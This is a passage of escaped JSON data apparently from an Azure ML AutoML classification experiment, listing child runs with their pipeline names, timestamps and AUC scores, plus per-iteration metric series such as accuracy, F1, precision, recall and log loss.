\"duration\": \"0:02:02\", \"iteration\": \"31\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f5aeaa65898\", \"primary_metric\": 0.81265617, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_32\", \"run_number\": 288, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:28:31.907527Z\", \"end_time\": \"2021-02-01T22:30:26.977168Z\", \"created_time\": \"2021-02-01T22:28:21.78482Z\", \"created_time_dt\": \"2021-02-01T22:28:21.78482Z\", \"duration\": \"0:02:05\", \"iteration\": \"32\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.83479911, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_33\", \"run_number\": 289, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:28:36.168855Z\", \"end_time\": \"2021-02-01T22:30:40.792502Z\", \"created_time\": \"2021-02-01T22:28:25.388978Z\", \"created_time_dt\": \"2021-02-01T22:28:25.388978Z\", \"duration\": \"0:02:15\", \"iteration\": \"33\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"SparseNormalizer, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.SparseNormalizer object at 0x7f317ad4d550\", \"primary_metric\": 0.68161267, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_34\", \"run_number\": 290, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:28:39.12379Z\", \"end_time\": \"2021-02-01T22:30:39.589743Z\", \"created_time\": \"2021-02-01T22:28:28.490277Z\", \"created_time_dt\": \"2021-02-01T22:28:28.490277Z\", \"duration\": \"0:02:11\", \"iteration\": \"34\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, LogisticRegression\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f7e0002db70\", \"primary_metric\": 0.80725984, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_35\", \"run_number\": 291, \"metric\": null, \"status\": \"Canceled\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:29:15.604776Z\", \"end_time\": \"2021-02-01T22:30:47.759259Z\", \"created_time\": \"2021-02-01T22:29:03.532327Z\", \"created_time_dt\": \"2021-02-01T22:29:03.532327Z\", \"duration\": \"0:01:44\", \"iteration\": \"35\", \"goal\": null, \"run_name\": \"Canceled\", \"run_properties\": null}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_36\", \"run_number\": 292, \"metric\": null, \"status\": \"Canceled\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:29:19.705152Z\", \"end_time\": \"2021-02-01T22:30:47.037712Z\", \"created_time\": \"2021-02-01T22:29:09.058656Z\", \"created_time_dt\": \"2021-02-01T22:29:09.058656Z\", \"duration\": \"0:01:37\", \"iteration\": \"36\", \"goal\": null, \"run_name\": \"MaxAbsScaler, LightGBM\", \"run_properties\": null}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_37\", \"run_number\": 293, \"metric\": null, \"status\": \"Canceled\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:30:40.853578Z\", \"end_time\": \"2021-02-01T22:30:48.503158Z\", \"created_time\": \"2021-02-01T22:30:29.544535Z\", \"created_time_dt\": \"2021-02-01T22:30:29.544535Z\", \"duration\": \"0:00:18\", \"iteration\": \"37\", \"goal\": null, \"run_name\": \"Canceled\", \"run_properties\": null}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_38\", \"run_number\": 294, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:30:59.75509Z\", \"end_time\": \"2021-02-01T22:34:19.116173Z\", \"created_time\": \"2021-02-01T22:30:49.078194Z\", \"created_time_dt\": \"2021-02-01T22:30:49.078194Z\", \"duration\": \"0:03:30\", \"iteration\": \"38\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"VotingEnsemble\", \"run_properties\": \"classification_labels=None,\\n                              estimators=[('1',\\n                                           Pipeline(memory=None,\\n                                                    steps=[('maxabsscaler',\\n                                                            MaxAbsScaler(copy=True\", \"primary_metric\": 0.84749475, \"best_metric\": 0.84749475}], \"children_metrics\": {\"categories\": [0], \"series\": {\"AUC_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"AUC_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.8242456616125537, 0.8556880349836874, 0.8370041450796568, 0.837344258746973, 0.8319128851146695, 0.8350011902153321, 0.824139552572477, 0.8061122170990144, 0.788323353940372, 0.7924716661005649, 0.8153907719883813, 0.8030501516327325, 0.7709230861594426, 0.844475000572331, 0.8408493114972233, 0.8348286177523596, 0.8137511715269656, 0.8134342869150132, 0.7995449879203071, 0.8443936798981857, 0.8241678070463552, 0.8451741060770364, 0.8381858893256255, 0.8393107946573698, 0.8497669735919369, 0.8122127685693448, 0.8378205346835055, 0.835504605163876, 0.7704750676168455, 0.8253966985365608, 0.8332619574008033, 0.8338311699991918, 0.8387691736798655, 0.7346809796581804, 0.8067178311309873, 0.8641018324410416]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"AUC_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.8242456616125537, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8641018324410416]}], \"f1_score_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"f1_score_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7060869524729553, 0.7386733613551352, 0.6992212578066827, 0.7249392074654123, 0.6938957666144188, 0.6889557475101893, 0.6771209934407735, 0.616802123009589, 0.4363794781219525, 0.6967011820221602, 0.7074515386066953, 0.7010504580272914, 0.6763975866471001, 0.7133648428740039, 0.7125915962013177, 0.6923406772367976, 0.703666468652244, 0.6940187961236034, 0.7018479928343874, 0.7006019900541947, 0.7234252102382335, 0.7323429719874582, 0.7080983085986131, 0.7257953980090168, 0.7339091535370454, 0.7035258831465685, 0.7194737714782073, 0.7103741857447166, 0.6603789475146222, 0.7216676533974771, 0.7176333646296664, 0.705075327147772, 0.7356990136834132, 0.5250549493932896, 0.7132378729692569, 0.754706392921501]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"f1_score_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7060869524729553, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.754706392921501]}], \"recall_score_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"recall_score_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7538277511961724, 0.7461893369788106, 0.7513670539986329, 0.7448393711551605, 0.7448735475051265, 0.7122009569377992, 0.6640977443609023, 0.7161312371838687, 0.7226930963773068, 0.7161995898838005, 0.6939336978810664, 0.7565618591934381, 0.7565618591934382, 0.7526999316473001, 0.722658920027341, 0.713585099111415, 0.718762816131237, 0.7434894053315106, 0.746103896103896, 0.7656356801093642, 0.7448906356801095, 0.7591079972658921, 0.7643882433356118, 0.7395933014354067, 0.7539302802460697, 0.746120984278879, 0.7095864661654134, 0.7435235816814764, 0.7566302118933697, 0.7512816131237183, 0.7552631578947369, 0.6653622693096377, 0.7330827067669173, 0.7865345181134655]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"recall_score_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7865345181134655]}], \"weighted_accuracy\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"weighted_accuracy\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7658219048734536, 0.7945054420815822, 0.8024856949235233, 0.7537803599398873, 0.8023252169487505, 0.7950075915148033, 0.802477290129322, 0.7841633898674919, 0.775628855474176, 0.7187960897508028, 0.7201508520926321, 0.7121435779468733, 0.6920359704302351, 0.7947134642091852, 0.79537775444926, 0.8056836040113808, 0.7251481078136827, 0.7167292463432086, 0.7175201929361016, 0.7793562818141588, 0.7556480978965568, 0.7923072490351333, 0.7737974914965314, 0.785399388693536, 0.7876656489043206, 0.7682773412831079, 0.781593665150411, 0.7752159501425506, 0.7497263931604742, 0.7511286885311376, 0.7907613313757562, 0.7921448699416143, 0.758820616243476, 0.7534427646627713, 0.7386989588884996, 0.813738740947356]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"weighted_accuracy_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7658219048734536, 0.7945054420815822, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8024856949235233, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.8056836040113808, 0.813738740947356]}], \"precision_score_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"precision_score_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396148182527014, 0.7692657656068833, 0.7520825699743221, 0.7609520760175129, 0.7554812176503529, 0.7450981274823097, 0.7448917741929767, 0.7124270435000554, 0.5706868033843802, 0.7412405115528024, 0.7535412583172715, 0.750235689597012, 0.7259534315925349, 0.7552237707775337, 0.7533582046298194, 0.7560821319021201, 0.7484788190171452, 0.7384202354181113, 0.7472214685698566, 0.7433837940645757, 0.7583246574646643, 0.7631865534306315, 0.7462686320677201, 0.7589928420361292, 0.766965482354679, 0.7394720645437738, 0.7534056523295568, 0.7470513241044096, 0.7029086038563446, 0.7594109082390695, 0.754659937966848, 0.7473999212892053, 0.774770587157365, 0.6539482338593953, 0.7497268093104978, 0.785571587745776]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"precision_score_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396148182527014, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.774770587157365, 0.774770587157365, 0.774770587157365, 0.785571587745776]}], \"precision_score_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"precision_score_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7112261247846459, 0.7448891884111544, 0.7392793377989944, 0.7226079251556375, 0.7436357079322398, 0.7320645902873201, 0.7349045306667167, 0.7062715588863616, 0.5179101943964957, 0.6974606457527052, 0.7091518521136981, 0.7052040667905468, 0.6801095207577654, 0.7365605949242839, 0.7348811865868146, 0.7458346314943238, 0.7068736203663231, 0.6947556367987275, 0.7029530631424468, 0.7174121073576392, 0.7222131525336194, 0.7396391393586124, 0.718134752697632, 0.7322794801213324, 0.7403965681149594, 0.7107737856506116, 0.7278953823174702, 0.7211120271690014, 0.6759904873291831, 0.7220326725224668, 0.7333852492193794, 0.7295088530078773, 0.7355312740232178, 0.6331087844983069, 0.7113224130173722, 0.765731431102614]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"precision_score_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7112261247846459, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.7458346314943238, 0.765731431102614]}], \"log_loss\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"log_loss\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.6480770950597856, 0.4752990014529053, 0.5001485675078412, 0.5076125300387436, 0.5168917218464412, 0.5076979966611359, 0.5209025001812092, 0.5456507622717348, 0.580147985116864, 0.6346456083238894, 0.5622284828982, 0.5759726803559108, 0.6540108207070785, 0.5399900419024505, 0.4922794810899756, 0.5069827697274828, 0.5580022434720531, 0.5687695592993733, 0.5832244450888174, 0.48532808858878324, 0.5185033544076084, 0.4925117186247898, 0.5201432773723467, 0.5243508876759967, 0.4953372290721231, 0.665186068910875, 0.537968003031589, 0.5490501417451764, 0.5955242515193799, 0.5176165952261456, 0.5132483407740595, 0.5468321409541537, 0.5034244431712109, 0.6180062956720171, 0.5405507529942443, 0.47380908698264124]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"log_loss_min\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.6480770950597856, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.47380908698264124]}], \"accuracy\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"accuracy\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7538277511961724, 0.7461893369788106, 0.7513670539986329, 0.7448393711551605, 0.7448735475051265, 0.7122009569377992, 0.6640977443609023, 0.7161312371838687, 0.7226930963773068, 0.7161995898838005, 0.6939336978810664, 0.7565618591934381, 0.7565618591934382, 0.7526999316473001, 0.722658920027341, 0.713585099111415, 0.718762816131237, 0.7434894053315106, 0.746103896103896, 0.7656356801093642, 0.7448906356801095, 0.7591079972658921, 0.7643882433356118, 0.7395933014354067, 0.7539302802460697, 0.746120984278879, 0.7095864661654134, 0.7435235816814764, 0.7566302118933697, 0.7512816131237183, 0.7552631578947369, 0.6653622693096377, 0.7330827067669173, 0.7865345181134655]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"accuracy_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7865345181134655]}], \"recall_score_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"recall_score_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7538277511961724, 0.7461893369788106, 0.7513670539986329, 0.7448393711551605, 0.7448735475051265, 0.7122009569377992, 0.6640977443609023, 0.7161312371838687, 0.7226930963773068, 0.7161995898838005, 0.6939336978810664, 0.7565618591934381, 0.7565618591934382, 0.7526999316473001, 0.722658920027341, 0.713585099111415, 0.718762816131237, 0.7434894053315106, 0.746103896103896, 0.7656356801093642, 0.7448906356801095, 0.7591079972658921, 0.7643882433356118, 0.7395933014354067, 0.7539302802460697, 0.746120984278879, 0.7095864661654134, 0.7435235816814764, 0.7566302118933697, 0.7512816131237183, 0.7552631578947369, 0.6653622693096377, 0.7330827067669173, 0.7865345181134655]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"recall_score_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7865345181134655]}], \"average_precision_score_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": \"average_precision_score_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.8088900198552287, 0.8456601055549087, 0.8311358746496585, 0.84090548482326, 0.8330256081522117, 0.8320521024699652, 0.8280048374942686, 0.8191994067120106, 0.8233958302124265, 0.8105835373010641, 0.8350858059228026, 0.8222622347284405, 0.7947981173837984, 0.8362007182476587, 0.8336538163716014, 0.835359865097616, 0.8324493615401545, 0.8328320876172406, 0.8150448495243294, 0.8351010416705931, 0.8348013637791659, 0.8353056656890262, 0.8266773135730267, 0.8271530854832049, 0.8366171171379992, 0.8036932228257159, 0.8263114635528517, 0.8253850658441383, 0.7497110522964379, 0.8366396189719879, 0.819509883520803, 0.8166568935320472, 0.8449932874034569, 0.7016095110600704, 0.8247566613877121, 0.8582797328089278]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"lines\", \"name\": \"average_precision_score_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.8088900198552287, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8582797328089278]}], \"recall_score_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"38\"], \"mode\": \"markers\", \"name\": 